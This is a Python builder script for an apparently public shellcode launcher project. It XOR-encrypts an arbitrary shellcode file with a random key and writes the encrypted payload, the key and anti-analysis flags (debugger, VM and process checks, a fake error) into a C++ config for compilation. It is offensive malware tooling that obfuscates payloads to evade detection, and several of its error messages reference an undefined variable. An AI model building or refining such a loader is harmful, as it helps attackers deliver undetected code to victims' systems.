from sys import argv
from binascii import hexlify
from random import randint
from json import loads
from os import path

def bytes_to_str(var: str, array: str) -> str:
    res = "unsigned char "+var+"[] = \n"
    linec = 0

    for i in range(len(array)):
        if i != len(array)-1:
            if linec == 0:
                res += "    \"\\x"+format(array[i], "02x")
            else:
                res += "\\x"+format(array[i], "02x")
            linec += 1
        else:
            res += "\\x"+format(array[i], "02x")+"\";"
            break

        if linec == 7:
            linec = 0
            res += "\"\n"

    return res 

def mk_code() -> str: 
    filename = argv[1]

    try:
        file = open(filename, "rb")
    except Exception as e:
        print(f"[-] Error reading shellcode file: {e}")
        exit(1) 
    
    raw = file.read()
    file.close()

    key = []
    for i in range(len(raw)):
        key.append(randint(0, 255))
    
    enc = []
    for i in range(len(raw)):
        enc.append(raw[i] ^ key[i])

    enc = bytes_to_str("ENC", enc)
    key = bytes_to_str("KEY", key)

    return f"const int LEN = {len(raw)};\nunsigned char SC[LEN];"+"\n"+enc+"\n"+key

def mk_config() -> dict:
    keys = [
        "process_check",
        "debug_check",
        "fake_error",
        "vm_check",
        "debug"
    ]
    filename = argv[2]

    try:
        file = open(filename, "r")
    except Exception as e:
        print(f"[-] Error reading config file: {e}")
        exit(1) 

    raw = file.read()
    file.close()
    
    try:
        cfg = loads(raw)
    except:
        print(f"[-] Error parsing config: {e}")

    textcfg = f"""// created by config.py
#include <stdbool.h>
#include "config.hpp"

"""

    for k in keys:
        if not k in cfg.keys():
            print(f"[-] Required config option not found: {e}")
        textcfg += f"bool {k.upper()} = {str(cfg[k]).lower()};\n"        

    return textcfg

def main():
    print("github.com/ngn13/shellexec | shellcode launcher")

    if len(argv) != 3:
        print(f"[*] Usage: {argv[0]} <shellcode> <config>")
        exit(1)

    code = mk_code()
    cfg = mk_config()
    fullcfg = cfg+code

    try:
        f = open(path.join("src", "config.cpp"), "w")
    except Exception as e:
        print(f"[-] Cannot open config file: {e}")

    f.write(fullcfg)
    f.close()

    print("[+] Config file has been written")

if __name__ == "__main__":
    main()